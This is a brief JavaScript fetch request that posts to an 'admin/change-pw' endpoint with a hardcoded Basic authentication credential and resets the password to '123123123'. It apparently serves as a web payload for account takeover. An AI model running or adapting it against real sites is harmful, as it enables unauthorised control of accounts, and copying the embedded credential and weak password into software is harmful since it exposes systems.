fetch('admin/change-pw', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Authorization': 'Basic b25lc2hpZnQ6S28jMGY5QGdvbDBLUzY3bQ=='
  },
  body: 'changepw=1&password1=123123123&password2=123123123'
});
